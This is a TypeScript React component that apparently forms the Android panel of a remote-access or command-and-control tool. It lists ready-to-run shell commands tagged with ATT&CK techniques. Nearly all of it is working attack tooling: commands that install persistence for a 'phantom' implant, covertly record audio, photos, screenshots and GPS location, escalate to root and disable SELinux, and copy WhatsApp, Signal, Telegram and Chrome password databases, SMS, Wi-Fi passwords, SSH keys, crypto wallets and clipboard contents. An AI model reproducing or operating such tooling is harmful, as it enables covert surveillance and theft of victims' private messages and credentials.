import OSPanel from './OSPanel'
import type { OSConfig, Category } from './OSPanel'
import type { Session } from '../types'

const MODULES: Category[] = [
  {
    id: 'device', icon: '📱', label: 'DEVICE INFO', atkId: 'TA0007',
    cmds: [
      { icon: '📱', label: 'Model / Brand',          cmd: 'getprop ro.product.model; getprop ro.product.brand; getprop ro.product.manufacturer; getprop ro.product.name', tag: 'T1082' },
      { icon: '🤖', label: 'Android Version',        cmd: 'getprop ro.build.version.release; getprop ro.build.version.sdk; getprop ro.build.version.security_patch; getprop ro.build.id', tag: 'T1082' },
      { icon: '🔒', label: 'Security State',         cmd: 'getprop ro.crypto.state; getprop ro.boot.verifiedbootstate; getprop ro.boot.flash.locked; getprop ro.debuggable; getprop ro.build.tags', tag: 'T1082' },
      { icon: '⚙️', label: 'Hardware / SoC',         cmd: 'getprop ro.hardware; getprop ro.product.board; getprop ro.product.cpu.abi; getprop ro.product.cpu.abilist', tag: 'T1082' },
      { icon: '🔑', label: 'Android ID',             cmd: 'settings get secure android_id 2>&1', tag: 'T1033' },
      { icon: '📟', label: 'SIM / Carrier',          cmd: 'getprop gsm.operator.alpha; getprop gsm.network.type; getprop gsm.sim.state; getprop gsm.operator.iso-country', tag: 'T1033' },
      { icon: '🔋', label: 'Battery Status',         cmd: 'dumpsys battery 2>&1', tag: 'T1082' },
      { icon: '🧠', label: 'Memory Info',            cmd: 'cat /proc/meminfo 2>&1 | head -10', tag: 'T1082' },
      { icon: '💾', label: 'Storage Usage',          cmd: 'df /sdcard /data /system 2>&1', tag: 'T1082' },
      { icon: '👤', label: 'UID / SELinux Context',  cmd: 'id 2>&1; cat /proc/self/attr/current 2>&1; whoami 2>&1', tag: 'T1033' },
      { icon: '🌍', label: 'Locale / Language',      cmd: 'getprop persist.sys.locale; getprop ro.product.locale; settings get system locale 2>&1', tag: 'T1082' },
      { icon: '📋', label: 'All getprop',            cmd: 'getprop 2>&1', tag: 'T1082' },
    ],
  },
  {
    id: 'network', icon: '📡', label: 'NETWORK', atkId: 'TA0007',
    cmds: [
      { icon: '🌐', label: 'IP Addresses',           cmd: 'ip addr show 2>&1', tag: 'T1016' },
      { icon: '🛤️', label: 'Routing Table',         cmd: 'ip route show 2>&1', tag: 'T1016' },
      { icon: '🔌', label: 'DNS Servers',            cmd: 'getprop net.dns1; getprop net.dns2; getprop dhcp.wlan0.dns1', tag: 'T1016' },
      { icon: '📶', label: 'WiFi Status (cmd)',      cmd: 'cmd wifi status 2>&1', tag: 'T1016', note: 'Android 11+' },
      { icon: '🔗', label: 'TCP Connections',        cmd: 'cat /proc/net/tcp 2>&1 | head -30; cat /proc/net/tcp6 2>&1 | head -20', tag: 'T1049' },
      { icon: '🏠', label: 'Hosts File',             cmd: 'cat /system/etc/hosts 2>&1', tag: 'T1016' },
      { icon: '📡', label: 'Bluetooth State',        cmd: 'settings get global bluetooth_on 2>&1; cmd bluetooth_manager state 2>&1', tag: 'T1016' },
    ],
  },
  {
    id: 'apps', icon: '📦', label: 'APPS / PROCS', atkId: 'TA0007',
    cmds: [
      { icon: '📦', label: 'User Apps',              cmd: 'pm list packages -3 2>&1', tag: 'T1518' },
      { icon: '⚙️', label: 'System Apps',           cmd: 'pm list packages -s 2>&1 | head -60', tag: 'T1518' },
      { icon: '📂', label: 'App APK Paths',          cmd: 'pm list packages -f -3 2>&1 | head -40', tag: 'T1518' },
      { icon: '🏃', label: 'Running Processes',      cmd: 'ps -A 2>&1 | head -60 || ps 2>&1 | head -60', tag: 'T1057' },
      { icon: '🔄', label: 'Running Services',       cmd: 'dumpsys activity services 2>&1 | head -50', tag: 'T1007' },
      { icon: '🔍', label: 'Security Apps',          cmd: 'pm list packages 2>&1 | grep -i "security\\|antivirus\\|protect\\|kaspersky\\|norton\\|avast"', tag: 'T1518' },
      { icon: '🎯', label: 'Finance / Crypto Apps',  cmd: 'pm list packages 2>&1 | grep -i "bank\\|pay\\|crypto\\|coinbase\\|binance\\|wallet"', tag: 'T1518' },
      { icon: '💬', label: 'Messaging Apps',         cmd: 'pm list packages 2>&1 | grep -i "whatsapp\\|telegram\\|signal\\|viber\\|instagram\\|facebook"', tag: 'T1518' },
    ],
  },
  {
    id: 'comms', icon: '💬', label: 'COMMS', atkId: 'TA0009',
    cmds: [
      { icon: '📨', label: 'SMS Inbox',              cmd: 'content query --uri content://sms/inbox --projection address:body:date 2>&1 | head -100', tag: 'T1636', note: 'Needs READ_SMS' },
      { icon: '📤', label: 'SMS Sent',               cmd: 'content query --uri content://sms/sent --projection address:body:date 2>&1 | head -80', tag: 'T1636' },
      { icon: '👥', label: 'Contacts',               cmd: 'content query --uri content://contacts/phones/ --projection display_name:number 2>&1 | head -150', tag: 'T1636', note: 'Needs READ_CONTACTS' },
      { icon: '📞', label: 'Call Log',               cmd: 'content query --uri content://call_log/calls --projection number:date:type:duration 2>&1 | head -80', tag: 'T1636' },
      { icon: '📸', label: 'WhatsApp Media',         cmd: 'ls /sdcard/WhatsApp/Media 2>&1 || ls /sdcard/Android/media/com.whatsapp/WhatsApp/Media 2>&1', tag: 'T1636' },
      { icon: '✈️', label: 'Telegram Downloads',     cmd: 'ls /sdcard/Telegram 2>&1 || ls /sdcard/Android/data/org.telegram.messenger/files 2>&1', tag: 'T1636' },
    ],
  },
  {
    id: 'persist', icon: '🔒', label: 'PERSISTENCE', atkId: 'TA0003',
    cmds: [
      { icon: '🔍', label: 'Check Persistence',      cmd: 'ps 2>&1 | grep phantom | grep -v grep; cat /data/data/com.termux/files/home/.termux/boot/phantom.sh 2>&1; grep phantom /data/data/com.termux/files/home/.bashrc 2>&1', tag: 'T1398' },
      { icon: '🔄', label: 'Start Watchdog Loop',    cmd: 'nohup sh -c "while true; do /data/data/com.termux/files/home/phantom 2>/dev/null; sleep 15; done" > /dev/null 2>&1 & echo watchdog-started', tag: 'T1398' },
      { icon: '📦', label: 'Termux:Boot Script',     cmd: 'mkdir -p /data/data/com.termux/files/home/.termux/boot && printf "#!/data/data/com.termux/files/usr/bin/sh\\nnohup ~/phantom > /dev/null 2>&1 &\\n" > /data/data/com.termux/files/home/.termux/boot/phantom.sh && chmod +x /data/data/com.termux/files/home/.termux/boot/phantom.sh && echo boot-script-installed', tag: 'T1398' },
      { icon: '🏃', label: 'Inject .bashrc',         cmd: 'grep -q phantom /data/data/com.termux/files/home/.bashrc 2>/dev/null || echo "nohup ~/phantom > /dev/null 2>&1 &" >> /data/data/com.termux/files/home/.bashrc && echo bashrc-updated', tag: 'T1546' },
      { icon: '🧹', label: 'Remove All Persistence', cmd: 'pkill -f phantom 2>&1; rm -f /data/data/com.termux/files/home/.termux/boot/phantom.sh 2>&1; sed -i "/phantom/d" /data/data/com.termux/files/home/.bashrc 2>&1; echo removed', tag: 'T1070' },
    ],
  },
  {
    id: 'specops', icon: '🎯', label: 'SPEC OPS', atkId: 'TA0009',
    cmds: [
      { icon: '📍', label: 'GPS (Termux:API)',        cmd: 'termux-location --provider gps 2>&1 || echo needs-termux-api-app', tag: 'T1430' },
      { icon: '🗺️', label: 'Network Location',       cmd: 'termux-location --provider network 2>&1 || dumpsys location 2>&1 | head -30', tag: 'T1430' },
      { icon: '🎙️', label: 'Record Audio 10s',       cmd: 'termux-microphone-record -l 10 -f /sdcard/Download/rec.m4a 2>&1 && echo saved || echo needs-termux-api', tag: 'T1429' },
      { icon: '📷', label: 'Take Photo',              cmd: 'termux-camera-photo /sdcard/Download/photo.jpg 2>&1 && echo saved || echo needs-termux-api', tag: 'T1512' },
      { icon: '📸', label: 'Screenshot (screencap)',  cmd: 'screencap -p /sdcard/Download/screenshot.png 2>&1 && echo saved || echo failed', tag: 'T1513' },
      { icon: '💰', label: 'Find Cred Files',         cmd: 'find /sdcard -name "*.json" -o -name "*.conf" -o -name "*.key" 2>&1 | grep -i "auth\\|token\\|cred\\|pass\\|secret" | head -30', tag: 'T1552' },
      { icon: '🌐', label: 'Device Fingerprint',      cmd: 'echo === DEVICE ===; getprop ro.product.model; getprop ro.build.version.release; getprop ro.build.version.sdk; echo === NET ===; ip addr show | grep inet; echo === UID ===; id; echo === APPS ===; pm list packages -3 2>&1 | wc -l', tag: 'T1082' },
    ],
  },
  {
    id: 'root', icon: '💀', label: 'ROOT / PRIVESC', atkId: 'TA0004',
    cmds: [
      { icon: '🔑', label: '① Check Root',           cmd: 'su -c id 2>&1; which su 2>&1; ls /sbin/su /system/bin/su /system/xbin/su 2>&1',    tag: 'T1068' },
      { icon: '🧪', label: '② Magisk/KernelSU',     cmd: 'which magisk ksud apd 2>&1; ls /data/adb/magisk /data/adb/ksu 2>/dev/null; getprop ro.magisk.version 2>&1; ls /sbin/.magisk/modules 2>/dev/null',  tag: 'T1068' },
      { icon: '🔓', label: '③ Disable SELinux',      cmd: 'su -c "setenforce 0 && getenforce 2>&1" 2>&1',                                      tag: 'T1068', note: 'Permissive mode' },
      { icon: '💉', label: '④ Mount /system RW',     cmd: 'su -c "mount -o rw,remount /system 2>&1 && mount | grep system" 2>&1',               tag: 'T1574' },
      { icon: '🐚', label: '⑤ Root Shell ID',        cmd: 'su -c "id; whoami; cat /proc/self/attr/current; getenforce" 2>&1',                   tag: 'T1068' },
      { icon: '🌍', label: '⑥ Dump /etc/shadow',     cmd: 'su -c "cat /etc/shadow 2>&1 || cat /data/misc/password.key 2>&1" 2>&1',              tag: 'T1003' },
      { icon: '🔒', label: '⑦ Dump Keystore',        cmd: 'su -c "ls /data/misc/keystore/; ls /data/misc/keychain/" 2>&1',                      tag: 'T1555' },
      { icon: '📲', label: '⑧ All Apps Data',        cmd: 'su -c "ls /data/data/ 2>&1" 2>&1',                                                   tag: 'T1005' },
      { icon: '📱', label: '⑨ ADB Auth Keys',        cmd: 'su -c "cat /data/misc/adb/adb_keys 2>&1" 2>&1',                                      tag: 'T1552' },
      { icon: '⚡', label: '⑩ Kernel Version',       cmd: 'uname -r; cat /proc/version 2>&1; cat /proc/sys/kernel/osrelease 2>&1',              tag: 'T1082' },
    ],
  },
  {
    id: 'dump', icon: '💾', label: 'DUMP DATA (ROOT)', atkId: 'TA0009',
    cmds: [
      { icon: '💬', label: 'WhatsApp DB → /sdcard',  cmd: 'su -c "cp /data/data/com.whatsapp/databases/msgstore.db /sdcard/Download/wa_msg.db 2>&1; cp /data/data/com.whatsapp/databases/wa.db /sdcard/Download/wa_contacts.db 2>&1; cp /data/data/com.whatsapp/files/key /sdcard/Download/wa_key 2>&1; echo done" 2>&1', tag: 'T1636', note: 'Copies to /sdcard' },
      { icon: '✈️',  label: 'Telegram DB → /sdcard', cmd: 'su -c "find /data/data/org.telegram.messenger /data/user/0/org.telegram.messenger -name \'*.db\' 2>/dev/null | while read f; do cp $f /sdcard/Download/tg_$(basename $f) 2>&1; done; echo done" 2>&1', tag: 'T1636' },
      { icon: '📶', label: 'Signal DB → /sdcard',    cmd: 'su -c "cp /data/data/org.thoughtcrime.securesms/databases/signal.db /sdcard/Download/signal.db 2>&1; cp /data/data/org.thoughtcrime.securesms/shared_prefs/SecureSMS-Preferences.xml /sdcard/Download/signal_prefs.xml 2>&1; echo done" 2>&1', tag: 'T1636' },
      { icon: '🌐', label: 'Chrome Passwords',       cmd: 'su -c "cp -r \'/data/data/com.android.chrome/app_chrome/Default/Login Data\' /sdcard/Download/chrome_passwords.db 2>&1; echo done" 2>&1', tag: 'T1555' },
      { icon: '📞', label: 'SMS + Contacts',         cmd: 'su -c "cp /data/data/com.android.providers.telephony/databases/mmssms.db /sdcard/Download/sms.db 2>&1; cp /data/data/com.android.providers.contacts/databases/contacts2.db /sdcard/Download/contacts.db 2>&1; echo done" 2>&1', tag: 'T1636' },
      { icon: '🔑', label: 'WiFi Passwords',         cmd: 'su -c "cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null || cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || cat /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml 2>/dev/null" 2>&1', tag: 'T1552' },
      { icon: '📸', label: 'All Photos List',        cmd: 'find /sdcard/DCIM /sdcard/Pictures /sdcard/Camera 2>&1 | grep -E "\\.(jpg|jpeg|png|mp4)$" | wc -l; echo files; ls /sdcard/DCIM/ 2>&1', tag: 'T1533' },
      { icon: '🗝️', label: 'SSH Keys',               cmd: 'su -c "find / -name id_rsa -o -name id_ed25519 -o -name authorized_keys 2>/dev/null | head -20" 2>&1', tag: 'T1552' },
      { icon: '💰', label: 'Crypto Wallets',         cmd: 'su -c "find /data/data -name \'wallet*\' -o -name \'keystore*\' -o -name \'seed*\' 2>/dev/null | head -30" 2>&1; find /sdcard -name \'wallet*\' -o -name \'*.key\' 2>&1 | head -20', tag: 'T1552' },
      { icon: '📋', label: 'All Clipboard',          cmd: 'su -c "service call clipboard 2 2>&1" 2>&1 || dumpsys clipboard 2>&1 | head -20', tag: 'T1414' },
    ],
  },
  {
    id: 'hunt', icon: '🎯', label: 'HUNT', atkId: 'TA0009',
    cmds: [
      { icon: '🔑', label: 'Hunt Auth Tokens',       cmd: 'find /sdcard -name "*.json" 2>&1 | xargs grep -l "token\\|auth\\|secret\\|key\\|password" 2>/dev/null | head -20', tag: 'T1552' },
      { icon: '💾', label: 'Hunt DB Files',          cmd: 'find /sdcard -name "*.db" -o -name "*.sqlite" 2>&1 | head -20',               tag: 'T1005' },
      { icon: '🔐', label: 'Hunt KeePass',           cmd: 'find /sdcard -name "*.kdbx" -o -name "*.kdb" 2>&1 | head -10',                tag: 'T1552' },
      { icon: '📸', label: 'DCIM Photo Count',       cmd: 'ls /sdcard/DCIM 2>&1; find /sdcard/DCIM -name "*.jpg" -o -name "*.mp4" 2>&1 | wc -l', tag: 'T1533' },
      { icon: '🌐', label: 'Browser Bookmarks',      cmd: 'find /sdcard -name "bookmarks*" -o -name "Browser" 2>&1 | head -10',          tag: 'T1005' },
      { icon: '💬', label: 'WhatsApp DB Location',   cmd: 'find /sdcard -name "msgstore.db*" 2>&1 | head -5; ls /sdcard/WhatsApp/Databases/ 2>&1', tag: 'T1636' },
      { icon: '📱', label: 'Telegram DB Location',   cmd: 'find /sdcard/Android/data -name "*.db" 2>&1 | grep telegram | head -5',       tag: 'T1636' },
    ],
  },
]

function joinUnix(base: string, name: string) { return base.replace(/\/+$/, '') + '/' + name }
function parentUnix(p: string) {
  if (p === '/') return '/'
  const t = p.replace(/\/+$/, '')
  const i = t.lastIndexOf('/')
  return i <= 0 ? '/' : t.slice(0, i)
}

const CONFIG: OSConfig = {
  name:       'Android',
  icon:       '🤖',
  prompt:     '$',
  filter:     (s: Session) => s.os?.toLowerCase().includes('android') || s.arch?.toLowerCase().includes('arm'),
  modules:    MODULES,
  defaultFs:  '/sdcard',
  joinPath:   joinUnix,
  parentPath: parentUnix,
  quickCmds: [
    { icon: '📱', label: 'Model / Brand',  cmd: 'getprop ro.product.model; getprop ro.product.brand; getprop ro.product.manufacturer' },
    { icon: '🤖', label: 'Android Ver',    cmd: 'getprop ro.build.version.release; getprop ro.build.version.sdk; getprop ro.build.version.security_patch' },
    { icon: '🔋', label: 'Battery',        cmd: 'dumpsys battery 2>&1' },
    { icon: '🌐', label: 'IP / Network',   cmd: 'ip addr show 2>&1; ip route show 2>&1' },
    { icon: '📦', label: 'User Apps',      cmd: 'pm list packages -3 2>&1' },
    { icon: '🏃', label: 'Processes',      cmd: 'ps -A 2>&1 | head -40 || ps 2>&1 | head -40' },
    { icon: '💾', label: 'Storage',        cmd: 'df /sdcard /data /system 2>&1' },
    { icon: '👤', label: 'UID / Context',  cmd: 'id 2>&1; cat /proc/self/attr/current 2>&1' },
  ],
}

interface Props { onOpenTerminal: (id: string, name?: string) => void }
export default function Android({ onOpenTerminal }: Props) {
  return <OSPanel config={CONFIG} onOpenTerminal={onOpenTerminal} />
}
